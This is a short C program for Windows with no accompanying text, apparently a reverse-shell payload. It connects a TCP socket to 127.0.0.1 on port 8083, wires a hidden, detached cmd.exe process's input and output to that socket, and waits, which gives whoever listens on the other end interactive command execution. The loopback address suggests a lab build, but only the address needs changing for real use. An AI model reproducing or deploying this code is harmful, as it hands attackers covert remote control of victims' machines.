#include <stdio.h>
#include <winsock2.h>

#include <Winbase.h>
#include <process.h>
#include <Tlhelp32.h>

#pragma comment(lib, "ws2_32.lib")

void main() 
{
	   STARTUPINFO          si;
   struct               sockaddr_in sa;
   PROCESS_INFORMATION  pi;
   int					s,n;
	WSADATA WSAData;
	WSAStartup(MAKEWORD(2,0), &WSAData);
	SOCKET sock;

	sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	sa.sin_addr.s_addr			= inet_addr("127.0.0.1");
	sa.sin_family				= AF_INET;
	sa.sin_port				= htons(8083);
	connect(sock, (SOCKADDR *)&sa, sizeof(sa));
	memset(&si, 0, sizeof(si));
	memset(&pi, 0, sizeof(pi));

   si.cb = sizeof(si);
   si.wShowWindow = SW_HIDE;
   si.dwFlags = STARTF_USESTDHANDLES| STARTF_USESHOWWINDOW;
   si.hStdInput = si.hStdOutput = si.hStdError = (void *)sock;
   CreateProcess(NULL,"cmd",NULL,NULL,TRUE,CREATE_NO_WINDOW | DETACHED_PROCESS,NULL,NULL,(STARTUPINFO*)&si,&pi);

   WaitForSingleObject(pi.hProcess,INFINITE);
   closesocket(sock);
	WSACleanup();
}